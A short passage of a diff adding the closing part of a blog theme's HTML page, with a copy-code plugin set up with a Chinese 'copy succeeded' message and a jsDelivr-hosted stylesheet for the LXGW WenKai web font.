+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.7.0/style.min.css" media="all">
+
+
+
+<!-- inject -->
+
+</div></body></html>
